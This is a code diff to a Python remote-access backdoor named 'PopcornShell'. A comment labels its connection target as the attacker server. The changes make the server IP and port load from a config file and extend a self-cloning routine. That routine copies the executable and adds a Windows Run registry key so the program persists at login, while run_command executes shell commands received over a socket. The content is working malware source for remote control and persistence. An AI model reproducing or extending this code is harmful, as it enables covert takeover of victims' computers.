@@ -2,16 +2,30 @@ import os
 import shutil
 import subprocess
 import sys
+import json
 
 from command_payload import CommandPayload
 from command_payload import parse_payload_to_output
 from secure_socket import SecureSocket
 
 # Attacker server ip and port
-ip = "192.168.1.215"
-port = 7890
+ip = "127.0.0.1"
+port = 7777
 
 exit_flag = False
+
+
+def load_settings():
+    global ip
+    global port
+    base_path = os.path.dirname(os.path.abspath(__file__))
+    data_path = os.path.join(base_path, "config.json")
+    # Read the data file
+    with open(data_path) as f:
+        data = json.load(f)
+        ip = data["Popcorn_Server_IP"]
+        port = int(data["Popcorn_Port"])
+    print(f"Server ip => {ip}, port => {port}")
 
 
 # Custom command behaviour
@@ -90,7 +104,6 @@ def create_socket():
             create_socket()
 
 
-
 # Run a line of shell command and returns the result
 # Todo: Keep one subprocess alive
 def run_command(cmd):
@@ -108,6 +121,7 @@ def run_command(cmd):
     payload = CommandPayload(stdout=result[0], stderr=result[1])
     return payload
 
+
 def clone_self():
     if os.name == "nt":
         # Clone and start up on windows
@@ -116,9 +130,14 @@ def clone_self():
             shutil.copyfile(sys.executable, path)
             cmd = f"reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v PopcornShell /t REG_SZ /d \"{path}\""
             subprocess.call(cmd, shell=True)
+        else:
+            if sys.executable != path:
+                os.remove(path)
+                shutil.copyfile(sys.executable, path)
 
 
 def main():
+    load_settings()
     clone_self()
     create_socket()
 
